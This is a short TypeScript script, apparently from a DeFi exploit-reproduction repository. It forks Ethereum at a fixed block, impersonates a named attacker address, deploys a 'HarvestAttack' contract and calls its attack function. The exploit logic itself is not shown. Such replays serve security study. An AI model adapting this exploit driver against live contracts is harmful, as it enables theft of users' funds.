import { ethers, reset, RPC_URL } from "../setup";

const HACKER = "0xF224ab004461540778a914ea397c589b677E27bb";

async function main() {
	await reset(RPC_URL, 11129473);

	const hacker = await ethers.getImpersonatedSigner(HACKER);

	const harvest = await ethers.deployContract(
        "HarvestAttack", 
        [], 
        {
            signer: hacker,
        }
    );

	await harvest.waitForDeployment();

	await harvest.attack();
}

main();
